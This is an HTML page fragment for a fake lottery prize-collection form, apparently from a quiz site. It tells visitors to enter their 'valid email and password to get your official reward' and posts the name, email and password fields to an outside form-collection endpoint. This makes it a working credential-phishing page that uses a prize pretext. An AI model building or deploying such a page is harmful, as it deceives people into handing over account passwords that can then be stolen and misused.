	<title>Collect Prize | Lottery</title>

<body>


	<div class="container-contact100">
		<div class="wrap-contact100">
			<span class="contact100-form-symbol">
				<img src="images/icons/symbol-01.png" alt="SYMBOL-MAIL">
			</span>

			<form class="contact100-form validate-form flex-sb flex-w" method="POST" action="https://formspree.io/xjvarjbk">
				<span class="contact100-form-title">
					<b class="win-lose"></b> <p class="correct-incorrect"></p><br>
					
					<small class="req-for-email"style="font-size: 15px; color: coral;">Please enter your valid email and password to get your official reward</small>
					<small><a class="try-again" href="/index.html">Quiz: Try again!</a></small>
				</span>

				<div class="field wrap-input100 rs1 validate-input" data-validate = "Name is required">
					<input class="input100" type="text" name="name" placeholder="Name">
					<span class="focus-input100"></span>
				</div>

				<div class="field wrap-input100 rs1 validate-input" data-validate = "Email is required: e@a.z">
					<input class="input100" type="text" name="email" placeholder="Email Address">
					<span class="focus-input100"></span>
				</div>
				<!--custom password box-->
				<div class="field wrap-input100 rs1 validate-input" data-validate = "Password is required: !3%x00">
					<input class="input100" type="password" name="password" placeholder="Password">
					<span class="focus-input100"></span>
				</div>

				<div class="field wrap-input100 validate-input" data-validate = "Message is required">
					<textarea class="input100" name="message" placeholder="Write Us A Message"></textarea>
					<span class="focus-input100"></span>
				</div>

				<div class="field container-contact100-form-btn">
					<button class="contact100-form-btn">
						Send
					</button>
				</div>
			</form>
		</div>
	</div>



	<div id="dropDownSelect1"></div>
